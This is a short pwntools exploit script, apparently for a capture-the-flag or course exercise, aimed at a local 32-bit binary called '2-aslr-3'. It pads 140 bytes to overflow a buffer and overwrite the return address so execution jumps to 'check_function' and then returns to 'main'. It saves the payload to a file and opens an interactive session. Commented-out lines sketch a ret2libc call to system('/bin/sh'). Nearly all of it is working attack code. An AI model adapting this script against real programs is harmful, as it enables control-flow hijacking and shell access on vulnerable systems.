from pwn import *

context.arch = 'i386'

#puts_addr = e.got['puts']



PROG = "./2-aslr-3"
ARG1 = ''
ENV = {}

e = ELF(PROG)
# set ARG and ENV

# libc = e.libc
p = process([PROG, ARG1], env=ENV)

p.recvline()
#p.recvuntil(b'printf')
printf_addr = e.got['printf']

log.info(f"this is the got printf: {hex(printf_addr)}")

check_function = e.symbols['check_function']
log.info(f"this is the check_function add: {hex(check_function)}")

#system_addr = libc_add + libc.symbols['system']
#log.info(f"this is the system addr?: {hex(system_addr)}")

#binsh_offset = next(e.libc.search(b'/bin/sh\00'))
#binsh_addr =  binsh_offset + libc_add



pad = 140

payload = flat(
b'A' * pad
+ p32(check_function)
+ p32(e.symbols['main'])
)

with open ("payload.bin", "wb") as f:
        f.write(payload)

p.sendline(payload)

p.interactive()